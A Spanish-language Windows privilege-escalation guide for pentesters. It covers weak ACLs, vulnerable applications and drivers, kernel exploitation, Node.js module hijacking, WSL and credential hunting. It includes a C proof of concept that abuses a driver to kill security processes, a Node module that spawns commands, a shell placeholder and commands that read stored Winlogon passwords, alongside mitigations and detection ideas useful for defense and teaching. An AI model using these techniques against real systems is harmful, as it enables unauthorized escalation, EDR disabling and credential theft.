En NTFS, un archivo legible puede tener un flujo `:$DATA` con nombre cuyo contenido no aparece en un listado de directorio normal. Para un conjunto pequeño y pertinente de archivos de copia de seguridad o configuración accesibles, revisa los **nombres y tamaños** de los flujos antes de abrir su contenido; Windows permite verlos mediante [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) y PowerShell mediante [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Un nombre de flujo que sugiera un secreto es solo una pista. Comprueba el acceso de lectura efectivo al archivo, la compatibilidad del sistema de archivos con los flujos, si el flujo contiene credenciales utilizables y con qué cuenta se autentican realmente. Evita los análisis recursivos de flujos y mostrar su contenido durante la enumeración rutinaria.

## Entradas auxiliares de Windows Driver Kit en tareas programadas

El Windows Driver Kit opcional incluye `StandaloneRunner.exe`, que puede consumir `command.txt`, `reboot.rsf` y un archivo de proyecto `working\rsf.rsf` de su directorio de ejecución. Una tarea programada o un servicio que inicie este auxiliar con una cuenta privilegiada puede convertir el acceso de escritura con privilegios bajos a esas entradas en ejecución de comandos en el contexto de esa cuenta, incluso si el ejecutable del auxiliar está protegido. Confirma que el proceso privilegiado consume esos archivos y que **ambos** archivos auxiliares se pueden crear o modificar; encontrar el auxiliar por sí solo no es suficiente.

En una tarea programada, revisa [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) de su acción y las ACL de las dos rutas de los archivos auxiliares. Si la tarea no especifica un directorio de trabajo, el directorio del ejecutable es solo una pista que hay que verificar, no una prueba de dónde lee la tarea sus entradas. También debe cumplirse el requisito del archivo de trabajo del proyecto. Comprueba la cuenta configurada como principal de la tarea en lugar de asumir que se ejecuta como SYSTEM.

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (quizá puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ruta de reparación del agente de Windows de Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) afecta a versiones anteriores de los agentes de Windows de Checkmk que escribían archivos de comandos en `C:\Windows\Temp` y luego ejecutaban un archivo preexistente protegido contra escritura cuando fallaba su reemplazo. El proveedor corrigió el problema en 2.1.0p40, 2.2.0p23, 2.3.0b1 y 2.4.0b1. Comprueba el nivel de parche completo instalado y si puede ejecutarse la operación afectada del agente; una etiqueta que solo indica la rama, como `2.1`, no permite determinar la exposición. La enumeración puede revisar la versión, el estado del servicio y los permisos de Temp sin crear archivos ni activar comandos del agente.

#### Revisión del servicio SAML de ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) afectó a la compilación 6210 y anteriores de ADSelfService Plus; el proveedor lo corrigió en la compilación 6211. Solo es relevante si SAML SSO **está o estuvo** habilitado. Por tanto, una entrada de producto instalado o la ruta de un servicio es un indicio, no una confirmación de vulnerabilidad: confirma la compilación exacta, el historial de configuración de SAML, la accesibilidad de red del servicio y la cuenta con la que se ejecuta. La ejecución de código a través del servicio hereda los privilegios de esa cuenta; para que se ejecute como SYSTEM, la instancia debe ejecutarse como SYSTEM. Un archivo `OfflineBackup_*.ezip` legible en el directorio Backup del producto es un indicio aparte de una copia de seguridad cifrada, no una prueba de que haya credenciales utilizables ni de que exista esta vulnerabilidad de SAML. Durante la enumeración rutinaria, registra su ruta y permisos de acceso sin descomprimirlo.

#### Límites entre el controlador Jenkins y las cuentas de dominio

En un controlador Jenkins de Windows, distingue entre el permiso para crear o configurar un job y el permiso para iniciarlo: [Jenkins los documenta como permisos separados: `Job/Create`, `Job/Configure` y `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Una programación configurada o un activador remoto pueden ofrecer otra vía para ejecutar una compilación, pero confirma que estén habilitados y que la compilación realmente se ejecute. La ejecución se realiza con la identidad del controlador o del agente seleccionado, y una credencial almacenada solo se puede usar si el job tiene acceso a su ámbito. Por separado, revisa el acceso a los metadatos de `JENKINS_HOME`: Jenkins guarda el material de credenciales y las claves de cifrado en `credentials.xml`, `secrets/hudson.util.Secret` y `secrets/master.key` ([almacenamiento de secretos de Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Su mera presencia no revela una contraseña; verifica el **acceso de lectura a los archivos necesarios** y una vía independiente de reutilización de cuentas, sin imprimir secretos en resultados compartidos. Si esa cuenta tiene permiso de escritura `scriptPath` en un objeto de usuario de AD, confirma que la ruta del script permita escritura y que exista un consumidor real, como un inicio de sesión o una tarea programada, que se ejecute como el usuario objetivo antes de considerarlo ejecución entre usuarios. Cualquier control adicional de grupos requiere verificar por separado los permisos efectivos de AD.

#### Identidad del agente autohospedado de Azure Pipelines

En un proyecto de Azure DevOps Server o Azure Pipelines, distingue entre el permiso para **crear o editar** una pipeline y el permiso para **ponerla en cola** y usar el pool de agentes seleccionado; [Microsoft documenta por separado los permisos de pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) y [la autorización del pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Si una cuenta con menos privilegios puede enviar un paso de script y ejecutar esa pipeline en un agente autohospedado de Windows, el paso se ejecuta como la [cuenta del sistema operativo configurada para el agente](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Antes de afirmar que existe una transición entre usuarios o a SYSTEM, verifica la pipeline exacta, las restricciones de rama y recursos, el pool autorizado, que el job pueda ejecutarse y la identidad del servicio del agente. Tener un agente instalado, un rol en el proyecto o permisos de escritura en el repositorio es solo un indicio; revisa los permisos y los metadatos locales del servicio sin iniciar una compilación durante la enumeración pasiva.

#### Credenciales de Microsoft Entra Connect Sync

[Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) entre la **cuenta del servicio ADSync**, que ejecuta el servicio de sincronización y accede a su base de datos SQL, y la **cuenta del conector AD DS**, cuyos permisos en el directorio dependen de las características de sincronización configuradas. Las credenciales del conector se almacenan cifradas en esa base de datos, y el material de claves está [protegido por DPAPI bajo la cuenta del servicio ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Tener instalado el servicio de sincronización, encontrar un grupo local cuyo nombre sugiera privilegios de administrador o tener visibilidad de la base de datos no demuestra que se pueda descifrar una credencial ni escalar privilegios en el dominio. Revisa por separado los permisos reales de lectura de la base de datos, el acceso a la cuenta del servicio y a las claves, la ubicación de instalación y de SQL, la identidad del conector configurado y los privilegios efectivos de AD de esa identidad. La enumeración rutinaria debe mostrar únicamente metadatos del servicio y del acceso, sin consultar ni imprimir los secretos almacenados.

#### Permisos de DLL de soporte de controladores de impresora

Un controlador de impresora instalado puede almacenar DLL de soporte en `C:\ProgramData` y cargarlas en un proceso de impresión con más privilegios. Revisa las ACL exactas del directorio del controlador y de las DLL, incluidos los directorios principales y los puntos de reanálisis, aunque se deniegue la enumeración de WMI de impresoras. Para el [problema del controlador de impresora Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), la ruta reportada era `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [la divulgación original](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) describe la carga de DLL por parte de `PrintIsolationHost.exe`. Una ACL que permita escritura es solo un indicio: verifica el acceso efectivo de escritura después de tener en cuenta las entradas de denegación, que el controlador correspondiente esté instalado y cargue el archivo con una identidad privilegiada, y si el controlador actualizado o el programa de seguridad del proveedor corrigieron la instalación. No infieras que existe una vulnerabilidad basándote únicamente en el nombre del directorio o la versión del controlador.

### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer un archivo especial o modificar algún binario que vaya a ejecutarse con una cuenta de Administrador (schedtasks).

Una forma de encontrar permisos débiles en carpetas o archivos del sistema es hacer lo siguiente:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistencia/ejecución mediante carga automática de plugins de Notepad++

Notepad++ carga automáticamente cualquier DLL de plugin ubicada en sus subcarpetas `plugins`. Si hay una instalación portable o una copia con permisos de escritura, agregar un plugin malicioso permite ejecutar código automáticamente dentro de `notepad++.exe` cada vez que se inicia (incluidos `DllMain` y las devoluciones de llamada del plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Ejecución al inicio

**Comprueba si puedes sobrescribir alguna clave del registro o algún binario que vaya a ejecutar otro usuario.**\
**Lee** la **siguiente página** para obtener más información sobre **ubicaciones interesantes de autoruns para escalar privilegios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Controladores

Busca posibles controladores de terceros **sospechosos/vulnerables**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Si un driver expone una primitiva arbitraria de lectura/escritura del kernel (algo común en handlers IOCTL mal diseñados), puedes escalar privilegios robando directamente un token SYSTEM de la memoria del kernel.<sup>[[13]](#references)</sup> Consulta aquí la técnica paso a paso:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

En bugs de condición de carrera en los que la llamada vulnerable abre una ruta de Object Manager controlada por el atacante, puedes ralentizar deliberadamente la búsqueda (usando componentes con longitud máxima o cadenas profundas de directorios) para ampliar la ventana de unos microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF en colas cancel-safe, disclosures de paged-pool y pivotes de I/O ring

Algunas cadenas de LPE del kernel de Windows pueden construirse a partir de dos bugs débiles por separado: una **condición de carrera en la duración de vida de una cola cancel-safe** que libera una solicitud/CBD mientras el bloqueo de la cola sigue retenido, y una disclosure de **liberación del bloqueo antes de la copia** que filtra una asignación liberada de paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoría y explotación:

- **Liberar con el bloqueo retenido y cancelar después**: busca una ruta de éxito que haga **Acquire -> CompleteRequest/free -> Release**, mientras que la ruta de cancelación hace **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Si la ruta de éxito llega a `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar el bloqueo de CBDQ/CSQ, un hilo bloqueado en `NtCancelIoFileEx -> IopCsqCancelRoutine` puede reanudarse después y pasar un `PFLT_CALLBACK_DATA` liberado a la función de eliminación del driver.
- **Recuperar el objeto de cola liberado** con una asignación de paged-pool controlada por el atacante y del mismo tamaño. Las entradas de cola de datos de `NPFS` son útiles porque se pueden controlar la carga útil y el tamaño, y luego examinarlas con operaciones de lectura/peek de pipe. Si el objeto liberado contiene enlaces de lista, sobrescríbelos con una **lista cíclica de nodos de solicitud falsos en memoria de usuario** para que el driver procese repetidamente estructuras de solicitud definidas por el atacante, en vez de detenerse en la cabecera de la lista original.
- **Convertir una escritura predecible en algo más potente**: si la solicitud falsa redirige un puntero de contexto anidado usado por escrituras de contabilidad (marcas de tiempo / QPC / campos adyacentes al refcount), podrías obtener una escritura del kernel con **dirección controlada, pero valor no controlado**. En ese caso, apunta al campo **length/size** de un objeto del pool rociado en lugar de a un puntero final de código/datos; luego enumera las asignaciones del spray hasta que el objeto corrupto permita una **lectura out-of-bounds de paged-pool**.
- **Patrón de disclosure sujeto a carrera**: cualquier syscall que haga `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` es un buen candidato. La fiabilidad mejora si el atacante puede ampliar el búfer copiado (por ejemplo, añadiendo muchas entradas de lista/recursos que aumenten el tamaño de la asignación final del serializador), porque la copia más larga amplía la ventana de reemplazo sin que necesariamente se bloquee el sistema.
- **Objetivos de relleno con muchos punteros**: los arrays de búferes registrados de Windows **I/O ring** son excelentes objetivos de disclosure porque su tamaño en paged-pool se controla desde el atacante (`8 * regBufferCnt`) y cada elemento es un puntero del kernel a un `_IOP_MC_BUFFER_ENTRY`. Filtra uno de estos arrays, recupera el `IORING_OBJECT` circundante y luego corrompe **`RegBuffers`** y **`RegBuffersCount`** para que las operaciones posteriores de I/O ring usen entradas falsificadas por el atacante y proporcionen lectura/escritura arbitraria del kernel. Si la única escritura disponible te da un byte estable (por ejemplo, de `KUSER_SHARED_DATA+0x14`), usa **escrituras desalineadas superpuestas** para construir un puntero de usuario con bytes repetidos, como `0x0101010101010101`; asígnalo con `VirtualAlloc` y coloca allí el array falsificado de búferes registrados.<sup>[[30]](#references)</sup>

Indicadores útiles para depuración:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Una vez que obtengas read/write arbitrario del kernel mediante el I/O ring corrupto, roba un token SYSTEM usando el flujo de trabajo estándar posterior a la primitiva:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivas de corrupción de memoria de Registry hive

Las vulnerabilidades modernas de hive permiten preparar diseños deterministas, abusar de descendientes escribibles de HKLM/HKU y convertir la corrupción de metadatos en desbordamientos del paged pool del kernel sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusión de tipos en modo directo de `RtlQueryRegistryValues` mediante rutas controladas por el atacante

Algunos drivers aceptan una ruta del registry desde userland, solo validan que sea una cadena UTF-16 válida y luego llaman a `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` y un escalar de la pila como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo **real** del registry, no el tipo que esperaba el desarrollador.

Esto crea dos primitivas útiles:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: una ruta absoluta `\Registry\...` controlada por el usuario permite que el driver consulte claves elegidas por el atacante, revele su existencia mediante códigos de retorno o logs y, a veces, lea valores a los que el caller no podría acceder directamente.
- **Corrupción de memoria del kernel**: un destino escalar como `&readValue` queda sujeto a confusión de tipos como `REG_QWORD`, `UNICODE_STRING` o un búfer binario de tamaño variable, según el tipo del valor del registry.

Notas prácticas sobre la explotación:

- **Mitigación de Windows 8+**: si la consulta accede a un **untrusted hive** con `RTL_QUERY_REGISTRY_DIRECT` pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los callers del kernel provocan un fallo `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la posibilidad de explotación, busca **claves escribibles por el atacante dentro de trusted system hives**, en lugar de almacenar valores en `HKCU`.
- **Preparación en trusted hive**: usa NtObjectManager para enumerar los descendientes escribibles de `\Registry\Machine` y vuelve a ejecutar el escaneo con un token **low-integrity** duplicado para encontrar claves accesibles desde contextos sandboxed:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes de la pila y puede sobrescribir parcialmente un puntero a callback/función cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código primero carga un `REG_DWORD` controlado por el atacante en una variable escalar de la pila y luego reutiliza ese mismo búfer para leer una cadena, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, lo que produce una escritura en el kernel semicontrolada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo interpreta el primer `LONG` en `EntryContext` como el tamaño de un búfer con signo. Si una lectura previa de `REG_DWORD` deja un valor **negativo** controlado por el atacante en la variable escalar reutilizada, la siguiente consulta de `REG_BINARY` copia bytes del atacante directamente sobre posiciones adyacentes de la pila, lo que suele ser la vía más sencilla para sobrescribir por completo un puntero a callback.

Patrón de búsqueda clave: **lecturas heterogéneas del registro en la misma variable de la pila sin reinicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados y rutas de código donde la primera lectura del registro determina si se realiza una segunda lectura.

#### Abusar de la ausencia de FILE_DEVICE_SECURE_OPEN en objetos de dispositivo (LPE + eliminación de EDR)

Algunos drivers de terceros firmados crean su objeto de dispositivo con un SDDL robusto mediante IoCreateDeviceSecure, pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin esta flag, la DACL segura no se aplica al abrir el dispositivo mediante una ruta que contenga un componente adicional, lo que permite que cualquier usuario sin privilegios obtenga un handle usando una ruta de espacio de nombres como:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de un caso real)

Una vez que un usuario puede abrir el dispositivo, puede abusar de los IOCTL privilegiados que expone el driver para realizar LPE y manipular el sistema. Capacidades observadas en casos reales:
- Devolver handles con acceso total a procesos arbitrarios (robo de tokens / shell de SYSTEM mediante DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura sin restricciones en discos sin procesar (manipulación offline, técnicas de persistencia durante el arranque).
- Terminar procesos arbitrarios, incluidos los Protected Process/Light (PP/PPL), lo que permite eliminar AV/EDR desde userland mediante el kernel.

Patrón mínimo de PoC (modo usuario):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigaciones para desarrolladores
- Establece siempre FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo que deban estar restringidos por una DACL.
- Valida el contexto del llamador para las operaciones privilegiadas. Añade comprobaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTL (máscaras de acceso, METHOD_*, validación de entradas) y considera modelos con intermediarios en lugar de privilegios directos del kernel.

Ideas de detección para defensores
- Supervisa las aperturas desde modo usuario de nombres de dispositivos sospechosos (p. ej., \\ .\\amsdk*) y secuencias específicas de IOCTL indicativas de abuso.
- Aplica la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas de permitidos y bloqueados.


## PATH DLL Hijacking

Si tienes **permisos de escritura en una carpeta presente en PATH**, podrías secuestrar una DLL cargada por un proceso y **escalar privilegios**.<sup>[[2]](#references)</sup>

Comprueba los permisos de todas las carpetas dentro de PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Para obtener más información sobre cómo aprovechar esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Secuestro de la resolución de módulos de Node.js / Electron mediante `C:\node_modules`

Esta es una variante de **Windows uncontrolled search path** que afecta a las aplicaciones **Node.js** y **Electron** cuando realizan una importación sin calificar como `require("foo")` y falta el módulo esperado.<sup>[[20]](#references)</sup>

Node resuelve los paquetes recorriendo el árbol de directorios y comprobando las carpetas `node_modules` de cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, por lo que una aplicación iniciada desde `C:\Users\Administrator\project\app.js` podría buscar:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un archivo `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso Node/Electron con más privilegios** resuelva la dependencia que falta. La carga útil se ejecuta en el contexto de seguridad del proceso víctima, por lo que esto se convierte en **LPE** siempre que el objetivo se ejecute como administrador, desde una tarea programada elevada o un contenedor de servicio, o desde una aplicación de escritorio privilegiada iniciada automáticamente.

Esto es especialmente habitual cuando:

- una dependencia está declarada en `optionalDependencies`<sup>[[22]](#references)</sup>
- una biblioteca de terceros envuelve `require("foo")` en `try/catch` y continúa si falla
- se eliminó un paquete de las compilaciones de producción, se omitió durante el empaquetado o no se pudo instalar
- el `require()` vulnerable está muy adentro del árbol de dependencias, en lugar de estar en el código principal de la aplicación

### Búsqueda de objetivos vulnerables

Usa **Procmon** para comprobar la ruta de resolución:<sup>[[23]](#references)</sup>

- Filtra por `Process Name` = ejecutable objetivo (`node.exe`, el EXE de la aplicación Electron o el proceso contenedor)
- Filtra por `Path` `contains` `node_modules`
- Céntrate en `NAME NOT FOUND` y en la última apertura correcta en `C:\node_modules`

Patrones útiles para revisar código en archivos `.asar` desempaquetados o en el código fuente de la aplicación:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifica el **nombre del paquete que falta** mediante Procmon o revisando el código fuente.
2. Crea el directorio de búsqueda raíz si aún no existe:

```powershell
mkdir C:\node_modules
```

3. Coloca un módulo con el nombre exacto esperado:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Activa la aplicación víctima. Si la aplicación intenta ejecutar `require("foo")` y el módulo legítimo no está disponible, Node puede cargar `C:\node_modules\foo.js`.

Algunos ejemplos reales de módulos opcionales ausentes que encajan con este patrón son `bluebird` y `utf-8-validate`, pero la **técnica** es lo reutilizable: encuentra cualquier **importación bare ausente** que un proceso privilegiado de Windows con Node/Electron vaya a resolver.

### Ideas de detección y hardening

- Genera alertas cuando un usuario cree `C:\node_modules` o escriba allí archivos `.js` o paquetes nuevos.
- Busca procesos de alta integridad que lean desde `C:\node_modules\*`.
- Incluye todas las dependencias de runtime en producción y audita el uso de `optionalDependencies`.
- Revisa el código de terceros en busca de patrones silenciosos como `try { require("...") } catch {}`.
- Desactiva las comprobaciones opcionales cuando la biblioteca lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada de `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Red

### Recursos compartidos

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### archivo hosts

Busca otros equipos conocidos codificados directamente en el archivo hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfaces de red y DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Puertos abiertos

Comprueba desde el exterior si hay **servicios restringidos**.

```bash
netstat -ano #Opened ports?
```

Para un listener local, correlaciona su PID con el propietario del proceso, la ruta del ejecutable y cualquier servicio o tarea programada que lo inicie. Un servicio de control remoto puede proporcionar acceso como su usuario de escritorio solo si sus controles de autenticación y comandos lo permiten. Una aplicación TCP personalizada que se ejecute con una cuenta de mayores privilegios es un objetivo de revisión independiente: el listener y la ruta del binario son indicios pasivos, mientras que una vía autenticada de corrupción de memoria requiere analizar ese binario exacto y las entradas a las que se puede acceder. Si parece que un puerto expuesto pertenece a un proceso del sistema, compáralo con [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) antes de atribuirle el servicio backend; una regla de reenvío por sí sola no demuestra que el destino sea accesible o vulnerable.

### Tabla de enrutamiento

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabla ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reglas de Firewall

[**Consulta esta página para ver comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

El binario `bash.exe` también puede encontrarse en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, se te preguntará mediante una GUI si se debe permitir `nc` en el firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Para iniciar bash fácilmente como root, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Ser `root` dentro de WSL no otorga por sí solo privilegios de administrador de Windows. Si la identidad actual de Windows puede leer el sistema de archivos de una distribución, revisa los archivos del historial del shell (incluido `/root/.bash_history`) en busca de comandos que puedan haber registrado credenciales; para escalar privilegios, sigue siendo necesaria una cuenta válida con privilegios superiores y una vía de autenticación permitida. La estructura `LocalState\rootfs` corresponde a instalaciones antiguas de WSL; WSL 2 suele almacenar la distribución en un [disco virtual `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), así que primero identifica la distribución y la ruta de almacenamiento reales. Evita mostrar el contenido del historial durante la enumeración automatizada.

## Credenciales de Windows

### Credenciales de Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Trata `DefaultUserName` y `DefaultDomainName` como contexto de cuenta, no como credenciales. Un valor no vacío de `DefaultPassword` o `AltDefaultPassword` es un hallazgo de texto sin cifrar en el registro. Si `AutoAdminLogon=1` pero no se puede leer ninguna contraseña en texto sin cifrar, eso solo es un indicio: [Sysinternals Autologon puede almacenar la contraseña como un secreto LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), y las lecturas normales del registro no permiten determinar si ese secreto existe o si se puede recuperar. Revisa los derechos de acceso y la configuración real del inicio de sesión antes de informar de una exposición de credenciales.

### Administrador de credenciales / Windows Vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault almacena credenciales de servidores, sitios web y otros programas que **Windows** puede usar para **iniciar sesión automáticamente por los usuarios**. Al principio, podría parecer que los usuarios pueden almacenar credenciales de sitios como Facebook, Twitter o Gmail y hacer que los navegadores inicien sesión automáticamente, pero no es así como funciona.

Windows Vault almacena credenciales que Windows puede usar para iniciar sesión automáticamente por los usuarios; esto significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede utilizar este Administrador de credenciales** y Windows Vault, y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña cada vez.

A menos que las aplicaciones interactúen con el Administrador de credenciales, no creo que puedan usar las credenciales de un recurso determinado. Por lo tanto, si tu aplicación quiere utilizar el vault, debería **comunicarse de algún modo con el administrador de credenciales y solicitar las credenciales de ese recurso** al vault de almacenamiento predeterminado.

Usa `cmdkey` para enumerar las credenciales almacenadas en la máquina.

